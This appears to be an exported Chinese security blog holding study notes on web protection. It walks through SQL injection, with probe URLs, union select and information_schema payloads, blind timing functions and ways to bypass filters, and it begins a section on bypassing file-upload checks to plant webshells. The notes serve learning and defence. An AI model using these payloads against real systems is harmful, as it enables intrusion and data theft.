<h2 id="1-SQL-注入"><a href="#1-SQL-注入" class="headerlink" title="1 SQL 注入"></a>1 SQL 注入</h2><p>SQL 注人是指攻击者通过把恶意 SQL 命令插人到 Web 表单的输人域或页面请求的查询字符串中，并且插人的恶意 SQL 命令会导致原有 SQL 语句作用发生改变，从而达到欺骗服务器执行恶意的 SQL 命令的一种攻击方式。</p>
<p>如果数据库开启了<mark class="label warning">写权限</mark>，攻击者可利用数据库的写功能及特定函数，实现木马自动部署、系统提权等后续攻击。</p>
<h3 id="1-1-SQL注入攻击原理"><a href="#1-1-SQL注入攻击原理" class="headerlink" title="1.1 SQL注入攻击原理"></a>1.1 SQL注入攻击原理</h3><p>SQL 注入产生的原因是用户提交参数的合法性。</p>
<p>SQL 注入的本质是恶意攻击者将 SQL 代码插入或添加到程序的参数中，而程序并没有对传入的参数进行正确处理，导致参数中的数据被当作代码执行，并最终将执行结果返回给攻击者。</p>
<div class="note warning"><p>SQL注人的产生原因通常有以下几点：</p>
<p>（1）参数处理问题：</p>
<ul>
<li>对用户参数进行了错误的类型处理。</li>
<li>转义字符处理环节产生遗漏或可被绕过。</li>
</ul>
<p>（2）服务配置问题：</p>
<ul>
<li>不安全的数据库配置。</li>
<li>Web应用对错误的处理方式不当。<ul>
<li>不当的类型处理。</li>
<li>不安全的数据库配置。</li>
<li>不合理的查询集处理。</li>
<li>不当的错误处理。</li>
<li>转义字符处理不当。</li>
<li>多个提交处理不当。</li>
</ul>
</li>
</ul>
</div>

<h3 id="1-2-SQL注入的分类"><a href="#1-2-SQL注入的分类" class="headerlink" title="1.2 SQL注入的分类"></a>1.2 SQL注入的分类</h3><p>主要分为两类：</p>
<ul>
<li><mark class="label danger">回显注入</mark></li>
<li><mark class="label success">盲注</mark></li>
</ul>
<p>在了解 SQL 注人的流程之前需要知道的是：在实际使用中，Web 服务器的配置情况会直接决定 SQL 注人的成功与否。在服务器配置及防护方面，能影响 SQL 注人过程的主要有以下几个方面：</p>
<div class="note primary"><p>1 ）数据库是否开启报错请求。</p>
<p>2）服务器端是否允许数据库报错展示。</p>
<p>3）有过滤代码机制。</p>
<p>4）服务器开启了参数化查询或对查询过程<mark class="label danger">预编译</mark>。</p>
<p>5）服务器对查询进行了限速。</p>
</div>

<h3 id="1-3-回显注入"><a href="#1-3-回显注入" class="headerlink" title="1.3 回显注入"></a>1.3 回显注入</h3><p>SQL 注入漏洞的产生原因千差万别，主要与所用的数据库架构、版本有关系。</p>
<p>数据库可分为：</p>
<ul>
<li>关系型数据库：Oracle、MySQL、SQL Server、Access等。</li>
<li>非关系型数据库：MongoDB等。</li>
</ul>
<p>典型的攻击流程如下：</p>
<ol>
<li>判断 Web 系统使用的<mark class="label info">脚本语言</mark>，<mark class="label warning">发现注人点</mark>，并确定<mark class="label success">是否存在 SQL 注人漏洞</mark>。</li>
<li>判断 Web 系统的<mark class="label primary">数据库类型</mark>。</li>
<li>判断数据库中<mark class="label danger">表及相应字段的结构</mark>。</li>
<li>构造注入语句，得到<mark class="label success">表及相应字段的结构</mark>表中数据内容。</li>
<li>查找网站<mark class="label info">后台管理员</mark>，用得到的管理员账号和密码登录。</li>
<li>结合其他漏洞，上传<mark class="label default">Webshell</mark>并持续连接（留后门）。</li>
<li>进一步提权，得到<mark class="label warning">服务器的系统权限</mark>。</li>
</ol>
<p>以上为标准的 SQL 注人流程，最终的效果是<strong>获取目标站点的系统控制权限</strong>。在实际安全防护中，由于应用系统的业务特点各不相同，导致在每个阶段可获取的内容并不相同。并且5、6、7步其实与 SQL 注入没有直接关系，但可归类为 SQL 注人后的延伸攻击手段。</p>
<p>SQL 注入攻击中常见的攻击工具有</p>
<ul>
<li>啊 D 注人工具</li>
<li>havji</li>
<li>SQLmap</li>
<li>pangolin</li>
</ul>
<p>等，这些工具用法简单，能提供清晰的UI界面，并自带扫描功能，可自动寻找注人点、自动查表名、列名、字段名，并可直接注人，可查到数据库数据信息。其标准流程如下：</p>
<p>查找注人点 → 查库名 → 查表名 → 查字段名 → 查重点数据</p>
<h4 id="1-3-1-寻找注入点"><a href="#1-3-1-寻找注入点" class="headerlink" title="1.3.1 寻找注入点"></a>1.3.1 寻找注入点</h4><p>寻找注入点可以利用<strong>有回显</strong>的方法来确定页面是否有漏洞，如果没有回显，则可以进一步利用<strong>盲注</strong>的方法进行注入点探测。</p>
<div class="note danger"><p>盲注与回显注入基本相同，<mark class="label success">都是构造错误语句触发 Web 系统异常并观察</mark>。</p>
</div>

<p>如果页面对查询内容有回显，则可以利用基于数字或布尔的方法来探测是否存在漏洞，加入构造如下三个链接：</p>
<p>下三个链接，并观察页面的特点。</p>
<ol>
<li><code>http://www.test.com/showdetail.php?id=49</code></li>
<li><code> http://www.test.com/showdetail.php?id=49&#39; and &#39;1&#39;=&#39;1</code></li>
<li><code> http://www.test.com/showdetail.php?id=49&#39; and &#39;1&#39;=&#39;2</code></li>
</ol>
<p>访问以上三个链接时，产生的情况可能有如下几种：</p>
<ul>
<li><strong>页面没有变化</strong>：访问三个链接，显示的页面没有任何不同。这种情况说明后台针对此查询点的过滤比较严格，是否存在 SQL 注人漏洞还需进行后续测试。</li>
<li><strong>页面中少了部分内容</strong>：如访问前两个链接正常，第三个页面里有明显的内容缺失，则基本可以确定有漏洞存在。接下来就需要检测是否有<mark class="label warning">union显示位</mark>，如果没有，也可尝试进行<code>bool</code>注人（详情参见后续关于盲注的介绍）。</li>
<li><strong>错误回显</strong>：如果访问第三个链接后出现数据库报错信息，那么可以判定当前查询点存在注人，用标准的回显注人法即可实现 SQL 注人攻击。</li>
<li><strong>跳转到默认界面</strong>：如果第一个链接显示正常，第二、第三个链接直接跳转到首页或其他默认页面，那么这可能是后台有验证逻辑，或者是有在线防护系统或防护软件提供实时保护。之后可尝试绕过防护工具的思路（大小写混用、编码等）。</li>
<li><strong>直接关闭连接</strong>：如果在访问上述第二、三个链接时出现访问失败，那么这种情况下可尝试利用 Burpsuite 抓取服务器响应包，观察包头 server 字段内容。根据经验，这种情况通常为防护类工具直接开启在线阻断导致，后续可利用编码、换行等方式尝试绕过（极难成功）。</li>
</ul>
<h4 id="1-3-2-通过回显位确定字段数"><a href="#1-3-2-通过回显位确定字段数" class="headerlink" title="1.3.2 通过回显位确定字段数"></a>1.3.2 通过回显位确定字段数</h4><p>回显位指的是数据库查询结果在前端界面中显示出来的位置，也就是查询结果返回的是数据库中的<mark class="label info">哪列</mark>。在 SQL 注人中，一般利用<mark class="label success">order by</mark>、<mark class="label danger">union select</mark>等命令获取回显位的信息来猜测表内容，前者用来判断数据表的列数（字段数），后者用来判断回显位（字段）。具体使用方法如下:</p>
<p><code>XX.php?id =1&#39; order by 4#</code></p>
<p>使用<code>order by</code>的主要目的是判断当前数据表的列数。在测试过程中可修改对应的数值。如果输人的数值大于当前数据表的列数，则查询语句执行失败，由于页面有报错信息，则可以由此判断该数据表的列数</p>
<p><code>XX.php?id =1&#39; and &#39;1&#39;=&#39;2&#39; union select 1,2,3#</code></p>
<p>使用<code>union select</code>来判断回显位，当得到回显位确定是哪一列或哪些列之后，则可以构造语句来获取数据表的内容。</p>
<div class="note info"><p><code>union select</code>中经常会用到<code>NULL</code>起到占位的作用，从而避免显示结果干扰判断。</p>
</div>

<h4 id="1-3-3-注入并获取数据"><a href="#1-3-3-注入并获取数据" class="headerlink" title="1.3.3 注入并获取数据"></a>1.3.3 注入并获取数据</h4><p>尝试获取表、字段、数据的信息。</p>
<p>在 MySQL 5.0 之后的版本中，数据库内置了一个库<mark class="label warning">information_ schema</mark>，用于存储当前数据库中的所有库名、表名等信息。因此，可利用 SQL 注人方式，通过远程注入查询语句方式实现直接读取 MySQL 数据库中的<code>information_ schema</code>库的信息，从而获取感兴趣的信息。SQL 注入在<code>information_ schema</code>库中主要涉及内容可参考下图。</p>
<p><img data-src="https://i.loli.net/2020/12/22/Q2MZpR7gwm3TFc5.png" alt="information_ schema"></p>
<p>在 SQL 注入过程中，可直接查询<code>information_ schema</code>库来获得目标信息。这里要注意的是，如果需要对表名进行爆破，那么<mark class="label danger">表名需为十六进制格式</mark>。</p>
<p>基本注入语句可参考以下格式（回显位是4）：</p>
<ul>
<li><code>union select 1,2,3,table_name,from(select * from information_schema.tables where table_schema=hex(数据库名) order by 1 limit 0,1)</code></li>
<li><code>union select 1,2,column_name,from(select* from information_schema.columns where table_name=hex(表名) and table_schema=hex(数据库) limit 0,1)</code></li>
<li><code>union select 1,2,字段 from 表名 limit 0,1</code></li>
</ul>
<h3 id="1-4-盲注"><a href="#1-4-盲注" class="headerlink" title="1.4 盲注"></a>1.4 盲注</h3><p>相对于普通注人来说，盲注的难点在于<strong>前台没有回显位</strong>，导致无法直接获取到有效信息。只能对注人语句执行的正确与否进行判断，也就是只有<mark class="label success">true 和 false</mark>的区别，因此盲注攻击的难度较大。在实施盲注时，关键在于合理地实现对目标数据的猜测，并利用<mark class="label warning">时间延迟</mark>等手段实现猜测正确与否的证明。</p>
<p>常使用的函数有：</p>
<ul>
<li>leng()：获取数据库、表、字段长度等。</li>
<li>information_schema()：获取数据库信息。</li>
<li>定向获取字符<ul>
<li>mid()：获取字符串的值。</li>
<li>substring()：获取字符串的值。</li>
</ul>
</li>
<li>时间延迟<ul>
<li>benchmark(count,expr)：重复计算<code>expr</code>表达式<code>count</code>次来达到延时作用，但是内存消耗很大，会导致系统无响应。</li>
<li>sleep(n)：暂停数据库 n 秒</li>
</ul>
</li>
</ul>
<div class="note default"><p><code>mid()</code>和<code>substr()</code>都是<code>substring</code>的同义词。语法是：<code>mid(str,pos,len)</code>，<code>str </code>是字符串，<code>pos</code>是起始子字符串的位置（第一个字母为<code>1</code>），<code>len</code>是一个可选参数，它决定从起始位置返回的字符个数。例：</p>
<p><code>SELECT MID(&#39;I drink coffee&#39;, 3, 5) Result;</code>    结果为：<code>drink</code></p>
</div>

<p>【<a href="https://www.php.cn/mysql-tutorials-416587.html#:~:text=%E5%9C%A8MySQL%E4%B8%AD%EF%BC%8CMID%28%29%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E4%BB%8E%E6%8C%87%E5%AE%9A%E4%BD%8D%E7%BD%AE%E5%BC%80%E5%A7%8B%E7%9A%84%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%82MID%28%29%E5%92%8CSUBSTR%28%29%E9%83%BD%E6%98%AFSUBSTRING%28%29%E7%9A%84%E5%90%8C%E4%B9%89%E8%AF%8D%E3%80%82%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%E6%98%AF%E8%BF%99%E6%A0%B7%E7%9A%84%3A,MID%28str%2Cpos%2Clen%29%20%E8%BF%99%E9%87%8C%EF%BC%8Cstr%E6%98%AF%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8Cpos%E6%98%AF%E8%B5%B7%E5%A7%8B%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E4%BD%8D%E7%BD%AE%EF%BC%8Clen%E6%98%AF%E4%B8%80%E4%B8%AA%E5%8F%AF%E9%80%89%E5%8F%82%E6%95%B0%EF%BC%8C%E5%AE%83%E5%86%B3%E5%AE%9A%E4%BB%8E%E8%B5%B7%E5%A7%8B%E4%BD%8D%E7%BD%AE%E8%BF%94%E5%9B%9E%E7%9A%84%E5%AD%97%E7%AC%A6%E6%95%B0%E3%80%82">MySQL MID()函数的用法详解（代码示例）</a>】</p>
<p>【<a href="https://www.yiibai.com/mysql/substring.html">MySQL substring()函数</a>】</p>
<p>【<a href="https://www.cnblogs.com/duanxz/p/3936759.html">MYSQL BENCHMARK()函数</a>】</p>
<p>【<a href="https://cloud.tencent.com/developer/news/371274">Myql SLEEP函数和SQL注入</a>】</p>
<h3 id="1-5-常见防护手段及绕过方法"><a href="#1-5-常见防护手段及绕过方法" class="headerlink" title="1.5 常见防护手段及绕过方法"></a>1.5 常见防护手段及绕过方法</h3><div class="note danger"><p>SQL 注人的防护方法包括：</p>
<ul>
<li><mark class="label success">参数过滤</mark> </li>
<li><mark class="label danger">预编译处理</mark></li>
</ul>
</div>

<p><strong>参数过滤分为</strong>：</p>
<ul>
<li>数据类型限制（类型和长度）</li>
<li>危险字符处理</li>
</ul>
<p>通俗地说就是：要么严防死守，细致检查；要么严格限定参数的有效范围（<strong>参数化查询</strong>）。总之就是要尽可能限制用户可提交参数的类型。</p>
<p>针对 SQL 注入设计防护体系时，一定要与真实的业务场景进行配合，很多时候用简单的方式可获得非常好的防护效果。首先需尽可能详细地限制允许用户输人的参数类型及长度；其次，需考虑用户输人内容的特点及目的，开展有针对性的关键字、词过滤;如果是新建系统，推荐利用参数化查询手段，以实现更好的防护效果。当然，在这期间，应尽可能保证中间件版本的更新频率，可有效防护各类型攻击。以下将针对每种防护场景进行探讨。再次强调，防护力较弱的方法并不一定不适用，必须与实际环境相结合来选择。</p>
<h4 id="1-5-1-参数类型检测及绕过"><a href="#1-5-1-参数类型检测及绕过" class="headerlink" title="1.5.1 参数类型检测及绕过"></a>1.5.1 参数类型检测及绕过</h4><p>如链接：<code>xxxx.php?type_id=4&amp;new_id=690</code>，其中<code>type_id=4</code>和<code>new_id=690</code>为数字类型且长度均为一定值，均为用户可控，避免参数中出现非数字类型字符，并且对长度进行限制。或使用<strong>正则表达式</strong>可有效避免 SQL 注入。</p>
<div class="note success"><p><strong>防护方法</strong>：</p>
<ul>
<li><mark class="label info">使用函数对参数类型进行过滤</mark></li>
<li><mark class="label warning">正则表达式</mark></li>
</ul>
</div>

<p>参数类型检测主要<strong>面向字符型</strong>的参数查询功能，可以用以下函数实现：</p>
<ul>
<li><code>int intval ( mixed $var [, int $base = 10 ] )</code> ：通过使用指定的进制 base 转换（默认是十进制），返回变量<code>var</code>的<code>integer</code> 数值。</li>
<li><code>bool is_numeric ( mixed $var ) </code>：检测变量是否为数字或数字字符串，<strong>但此函数允许输人为负数和小数</strong>。</li>
<li><code>ctype_digit</code>： 检测字符串中的字符是否都是数字，<strong>负数和小数无法通过检测</strong>。</li>
</ul>
<p>在特定情况下，使用这三个函数可限制用户输人数字型参数，这在一些仅允许用户参数为数字的情况下非常适用，如查询 ID 号、学号、电话号码等业务场景。</p>
<p><strong>绕过方法</strong>：</p>
<p>当 Web 应用对数据进行数字类型的限制时，受制于字符类型要求，因此无法构造出有效的语句，也就无法利用 SQL 注人攻击来获取数据库内的信息。</p>
<p>但能使用某些技巧令数据库报错，如<code>is_numeric</code>支持<mark class="label primary">十六进制与十进制</mark>，提交<code>0x01</code>时它也会进行查询；<code> intval</code>虽然默认<strong>只支持十进制数字</strong>，但依然会有问题，比如提交<code>id=-1</code>时会出错。这些细微的差异可以帮助攻击者识别后台的过滤函数。</p>
<p>将字符串<code>&#39;1 or 1&#39;</code>转换为十六进制为<code>0x2731206f72203127</code>则可以进行绕过。</p>
<div class="note success"><p><strong><code>==</code>绕过</strong></p>
<p> PHP中有两种比较符号：</p>
<ul>
<li><code>===</code>：会同时比较字符串的值和类型</li>
<li><code> ==</code>： 会先将字符串换成相同类型，再作比较，属于弱类型比较</li>
</ul>
<p><code> ==</code>对于所有<code>0e</code>开头的比较都判为相等，<code> is_numeric()</code> 判断变量是否为<mark class="label danger">数字或数字字符串</mark>， <code>is_numeric()</code>函数会判断如果是数字和数字字符串则返回 TRUE，否则返回 FALSE，且 PHP 中弱类型比较时，会使<code>&#39;1234a&#39; == 1234</code>为真，或者<code>&#39;12345%00&#39;</code>，该函数还可能造成 SQL 注入，例如将<code>‘1 or 1&#39;</code>转换为16进制形式，再传参，就可以造成 SQL 注入。</p>
</div>

<h4 id="1-5-2-参数长度检测及绕过"><a href="#1-5-2-参数长度检测及绕过" class="headerlink" title="1.5.2 参数长度检测及绕过"></a>1.5.2 参数长度检测及绕过</h4><p><strong>防护思路</strong>：</p>
<p>当攻击者构造 SQL 语句进行注入攻击时，其 SQL 注入语句一般会有一定长度， 并且成功执行的 SQL 注入语句的字符数量通常会非常多，远大于正常业务中有效参数的长度。</p>
<p>因此，如果某处提交的内容具有固定的长度（如密码、用户名、邮箱、手机号等），那么严格控制这些提交点的字符长度，大部分注入语句就没办法成功执行。</p>
<p>PHP 下可以使用函数<code>strlen</code>来统计出入参数的长度，然后可使用代码对长度进行限制。</p>
<p><strong>绕过方法</strong>：</p>
<p>可使用注释符、and、or 等修改原有语句意图。</p>
<p>如使用注释符：<code>SELECT COUNT(*) FROM Login WHERE UserName=&#39;test&#39;--&#39; AND Password=&#39;(1)&#39;&quot;;</code></p>
<p>由于注释符的存在，此语句实际执行的内容则变为：<code>SELECT COUNT(*) FROM Login WHERE UserName=&#39;test&#39; ;</code>，只要有<code>test</code>用户存在，数据库就返回正确。</p>
<h4 id="1-5-3-危险参数过滤及绕过"><a href="#1-5-3-危险参数过滤及绕过" class="headerlink" title="1.5.3 危险参数过滤及绕过"></a>1.5.3 危险参数过滤及绕过</h4><p><strong>防护方法</strong>：</p>
<p>常见的危险参数过滤方法包括<strong>关键字</strong>、<strong>内置函数</strong>、<strong>敏感字符</strong>的过滤，其过滤方法主要有如下三种：</p>
<div class="note default"><ul>
<li><p><mark class="label info">黑名单过滤</mark></p>
<p>将一些可能用于注人的敏感字符写人黑名单中，如<code>&#39;</code> （单引号）、<code>union</code>、<code>select</code>等，也可能使用正则表达式做过滤，但黑名单可能会有疏漏。</p>
</li>
<li><p><mark class="label warning">白名单过滤</mark></p>
<p>例如，用数据库中的已知值校对，通常对参数结果进行合法性校验，符合白名单的数据方可显示。</p>
</li>
<li><p><mark class="label success">参数转义</mark></p>
<p>对变量默认进行adsalashes (在预定义字符前添加反斜杠)，使得SOL注人语句构造失败。</p>
</li>
<li><p>GPC 过滤</p>
<p>GPC 是GET、POST、COOKIE 三种数据接收方式的合称。在 PHP 中，如果利用<code>$_REQUEST</code>接受用户参数，那么这三种方式均可被接收。在早期PHP中，GPC过滤是内置的一种安全过滤函数，若用户提交的参数中存在敏感字符单引号<code>&#39;</code>、双引号<code>&quot;</code>、反斜 线<code>\</code>与<code>NUL</code> （<code>NULL</code>字符），就在其前端<mark class="label primary">添加反斜杠</mark>。</p>
</li>
</ul>
<p>由于白名单方式要求输出参数有着非常明显的特点，因此适用的业务场景非常有限。总体来说，防护手段仍建议以<mark class="label danger">黑名单+参数转义</mark>方式为主，这也是目前针对 SQL 敏感参数处理的主要方式。</p>
</div>

<p><strong>绕过方法</strong>：    </p>
<p>利用参数变化绕过黑名单防护，白名单没有很好的方法绕过，利用<strong>宽字节注入</strong>绕过 GPC 过滤。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;% tabs 参数绕过方法 %&#125;</span><br><span class="line">&lt;!-- tab 黑名单 --&gt;</span><br><span class="line"></span><br><span class="line">黑名单过滤一般试图阻止 **SQL 关键字**、特定的单个字符或空白符，那么绕过黑名单防护措施的核心思路就是：将关键字或特定符号进行不同形式的变换，从而实现绕过过滤器的目的。针对黑名单，目前存在的绕过方式有以下几种。</span><br><span class="line"></span><br><span class="line">- 使用大小写变种</span><br><span class="line"></span><br><span class="line">- 使用SQL注释代替空格（假设后台已经过滤空格，数据库会自动忽略注释符，执行时将其变成空格。</span><br><span class="line"></span><br><span class="line">- 嵌套过滤</span><br><span class="line"></span><br><span class="line">  在过滤器阻止的字符前面增加一个采用 URL 编码的空字节`%<span class="number">00</span>`。嵌套过滤后的表达式如`selecselectt`。过滤之后的部分就可重新结合成`select`。</span><br><span class="line"></span><br><span class="line">- `+`号拆分字符（`<span class="keyword">or</span>`等价于`<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;r&#x27;</span>`）</span><br><span class="line"></span><br><span class="line">- 利用系统注释符截断（`--`可对后续语句进行截断）</span><br><span class="line"></span><br><span class="line">- 替换字符</span><br><span class="line"></span><br><span class="line">  - 用`like`替代`=`，可以绕过对`=`的过滤。</span><br><span class="line">  - 用`in`替代`=`，可以绕过对`=`的过滤。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab GPC 过滤 --&gt;</span><br><span class="line"></span><br><span class="line">GPC 过滤是**PHP在5.4版本之前**存在的一种防护机制，其特点是在特殊字符前面加斜线`\`，如单引号`&#x27;`会形成`\&#x27;`的效果，导致原有的功能失效。因此，针对 GPC 过滤的情况，要对 GPC 添加的`\`进行转义。这种情况下可尝试&#123;% label default @宽字节注人 %&#125;方法。</span><br><span class="line"></span><br><span class="line">&#123;% note danger %&#125;</span><br><span class="line"></span><br><span class="line">宽字节带来的安全问题主要是编码转换引起的“吃 ASII 字符”（一字节）的现象，如果合理拼接，可让吃掉一字节后的剩余内容重新拼接成一个单引号`&#x27;`	(举例)。</span><br><span class="line"></span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">下面来分析 MySQL 的字符集转换过程。MySQL 收到请求时将请求数据从`charaeter_set_client`转换为`character_set_connection`。进行内部操作前将请求数据从`character_set_connection`转换为内部操作字符集，其确定方法如下：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 使用每个数据字段的`CHARACTER SET`设定值。</span><br><span class="line"><span class="number">2.</span> 若上述值不存在，则使用对应数据表的`DEFAULT CHARACTER SET`设定值（MySQL 扩展，非 SQL 标准)。</span><br><span class="line"><span class="number">3.</span> 若上述值不存在，则使用对应数据库的`DEFAULT CHARACTER SET`设定值。 </span><br><span class="line"><span class="number">4.</span> 若上述值不存在，则使用`character <span class="built_in">set</span> server`设定值。</span><br><span class="line"></span><br><span class="line">最终将操作结果从内部操作字符集转换为`character_set_results`。</span><br><span class="line"></span><br><span class="line">&#123;% note warning %&#125;</span><br><span class="line"></span><br><span class="line">宽字节注人发生的原因就是 PHP 发送请求到 MySQL 时字符集使用`character_set_client`设置值进行了一次编码，如果编码为 GB2312、GBK、GB18030、 BIG5、Shift_ JIS 等双字节编码，就会存在宽字节注人漏洞。</span><br><span class="line"></span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 白名单 --&gt;</span><br><span class="line">白名单防护严格限制输出内容，因此没有很好的绕过手段。</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure>



<h4 id="1-5-4-针对过滤的绕过方式汇总"><a href="#1-5-4-针对过滤的绕过方式汇总" class="headerlink" title="1.5.4 针对过滤的绕过方式汇总"></a>1.5.4 针对过滤的绕过方式汇总</h4><p><strong>（1）尖括号（大于小于）过滤绕过方式</strong></p>
<p>用于替代大于<code>&gt;</code>或小于<code>&lt;</code>符号或等号<code>=</code>主要使用函数：<code>between</code>、<code>greatest</code>。</p>
<p><code>between mix and max</code>：</p>
<ul>
<li>可利用<code>between 114 and 114</code>来替代<code>=114</code>，也就是字符<code>r</code></li>
<li>可利用<code>between 113 and 115</code>来替代<code>&gt;113 and &lt;115</code></li>
</ul>
<p><code>greatest(a,b)</code>：</p>
<ul>
<li><code>greatest(ascii(mid(user(),1,1)),140)&gt;=140</code>，判断<code>user()</code>第一个字符的<code>ASCII</code>。</li>
</ul>
<h4 id="1-5-5-预编译后参数化查询"><a href="#1-5-5-预编译后参数化查询" class="headerlink" title="1.5.5 预编译后参数化查询"></a>1.5.5 预编译后参数化查询</h4><p>【<a href="https://directoree.top/post/sqlinject/">数据库编译原理和注入</a>】</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>知识笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Web 安全防护指南基础篇-文件上传</title>
    <url>/post/web-basic-safety-guide-uploadfile/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ (๑˃̵ᴗ˂̵) ପ( ˘ᵕ˘ ) ੭ </p>
<span id="more"></span>



<h2 id="1-文件上传"><a href="#1-文件上传" class="headerlink" title="1 文件上传"></a>1 文件上传</h2><h3 id="1-1-上传攻击原理"><a href="#1-1-上传攻击原理" class="headerlink" title="1.1 上传攻击原理"></a>1.1 上传攻击原理</h3><p>上传功能是用户与服务器进行文件交互的重要手段，攻击者的<strong>目标</strong>是取得当前 Web 服务器的<strong>权限</strong>。若通过 Web 层面开展攻击，必须将攻击者的木马插入 Web 系统中，并在服务器端执行。这就是文件注入攻击。</p>
<ol>
<li><strong>攻击原理</strong>：<mark class="label danger">文件上传攻击</mark>攻击者利用 Web 应用对文件上传过滤不严的漏洞，将应用程序定义范围之外的文件上传到 Web 服务器，并且此类文件通常是木马，在上传成功后攻击者即可获得当前的 webshell。</li>
<li><strong>上传原理</strong>：<mark class="label success">文件上传原理</mark>攻击者想要获取webshell，最直接的方法就是将 Web 木马插入到服务器进行成功解析。那么如何理解成功解析？假设目标服务器为用<code>PHP</code>语言构建的 Web 系统，那么针对上传点就需要利用<code>PHP</code>木马，并且要求木马在服务器以后缀名为<code>.php</code>进行保存。因此，<strong>上传木马的过程就是在 Web 系统中新增一个页面</strong>。 当木马上传成功后，攻击者就可远程访问这个木马文件，也就相当于浏览一个页面，只不过这个页面就是木马，具备读取、修改文件内容、连接数据库等功能。</li>
<li><strong>漏洞原因</strong>：<mark class="label warning">上传漏洞存在前提</mark>存在上传点且在上传点用户可独立控制上传内容，同时上传文件可被顺利解析。</li>
</ol>
<p>攻击端上传木马（<code>.php</code>）--&gt; 服务器，攻击端访问木马所在目录 --&gt; 服务器（成功解析并执行）</p>
<p><img data-src="https://i.loli.net/2020/12/17/vQnrx7zPtM9gsVi.png" alt="上传攻击防护思路"></p>
<h3 id="1-2-上传攻击条件"><a href="#1-2-上传攻击条件" class="headerlink" title="1.2 上传攻击条件"></a>1.2 上传攻击条件</h3><div class="note primary"><ol>
<li>目标网站具有<strong>上传功能</strong></li>
<li>上传的目标文件（木马）能够被 Web 服务器<strong>解析执行</strong></li>
<li>知道文件上传到服务器后的<strong>存放路径和文件名称</strong></li>
<li>目标文件可被用户访问</li>
</ol>
</div>

<p>以上四个条件为文件上传攻击的必要条件，对于攻击者来说缺一不可，对于防护这来说必须至少解决其中一条。</p>
<h3 id="1-3-上传检测绕过技术"><a href="#1-3-上传检测绕过技术" class="headerlink" title="1.3 上传检测绕过技术"></a>1.3 上传检测绕过技术</h3><p>基于客户端参数的检测手段：JS 防护、MIME 防护。 </p>
<h4 id="1-3-1-客户端-Javascript-检测及绕过"><a href="#1-3-1-客户端-Javascript-检测及绕过" class="headerlink" title="1.3.1 客户端 Javascript 检测及绕过"></a>1.3.1 客户端 Javascript 检测及绕过</h4><span id="Javascript">

<p><strong>防护方法</strong>：客户端 Javascript 检测是在表单上传到服务器前进行的检测， 检测<mark class="label success">文件名后缀</mark>，允许的后缀名放行通过，使用<mark class="label primary">白名单</mark>方式。</p>
</span>

<p><strong>绕过方法</strong>：</p>
<div class="note danger"><ul>
<li>浏览器禁用 JS 运行</li>
<li>抓包软件抓包更改后缀名（JS 防护手段的 JS 脚本是在 HTTP 数据包发出之前执行完毕的）</li>
</ul>
</div>

<h4 id="1-3-2-服务器端-MIME-检测及绕过"><a href="#1-3-2-服务器端-MIME-检测及绕过" class="headerlink" title="1.3.2 服务器端 MIME 检测及绕过"></a>1.3.2 服务器端 MIME 检测及绕过</h4><p>在 HTTP 协议中，会利用<code>Content-Type</code>标识本次上传的内容类型。这个类型由<strong>客户端的浏览器</strong>根据本次上传文件的<strong>后缀名</strong>自动生成，这里检测到的<code>Content-Type</code>是在<code>body</code>里。</p>
<p>客户端上传文件时会自动检测上传的文件类型，检测的依据是<mark class="label warning">文件后缀</mark>，检测的方法是通过检查 HTTP 包的<code>Content-Type</code>字段中的值来实现的。将<code>php</code>文件的后缀改成<code>png</code>，MIME 检测类型判断后缀为<code>imae/png</code>。</p>
<p>常见的类型如下：</p>
<table>
<thead>
<tr>
<th align="center">Content-Type</th>
<th align="center">含义</th>
<th align="center">Content-Type</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Image&#x2F;jpg</td>
<td align="center">JPG 图像</td>
<td align="center">Text&#x2F;html</td>
<td align="center">HTML 文档</td>
</tr>
<tr>
<td align="center">Image&#x2F;gif</td>
<td align="center">GIF 图像</td>
<td align="center">application&#x2F;XML</td>
<td align="center">XML 文档</td>
</tr>
<tr>
<td align="center">Image&#x2F;png</td>
<td align="center">PNG 图像</td>
<td align="center">application&#x2F;PDF</td>
<td align="center">PDF 文档</td>
</tr>
</tbody></table>
<p><strong>防护方法</strong>：通过在客户端浏览器检测<code>Content-Type</code>，使用白名单的方式放行通过。类似于<a href="#Javascript">客户端 Javascript 检测</a>防护方法。</p>
<p><strong>绕过方式</strong>：由于<code>Content-Type</code>类型是由客户端浏览器自动生成的，那么在这个过程中<code>Content-Type</code>的值是可控的（因为在客户端生成），只需要 HTTP 抓包后修改<code>Content-Type</code>即可绕过。</p>
<h4 id="1-3-3-服务器端文件扩展名检测及绕过"><a href="#1-3-3-服务器端文件扩展名检测及绕过" class="headerlink" title="1.3.3 服务器端文件扩展名检测及绕过"></a>1.3.3 服务器端文件扩展名检测及绕过</h4><p><strong>防护思路</strong>：</p>
<ol>
<li>基于客户端参数的检测手段可以在文件上传到服务器前对 HTTP 报文拦截进行修改，当服务器就收到上传的信息后，校验文件名是否合法，采用黑&#x2F;白名单方式。</li>
<li>完全不信赖用户所上传文件的后缀名，在用户上传文件到服务器之后，<strong>重新给上传文件添加后缀名</strong>。</li>
</ol>
<p><strong>防护方法</strong>：</p>
<ul>
<li><mark class="label info">文件后缀重命名</mark></li>
<li><mark class="label warning">白名单过滤</mark></li>
<li><mark class="label primary">黑名单过滤</mark></li>
</ul>
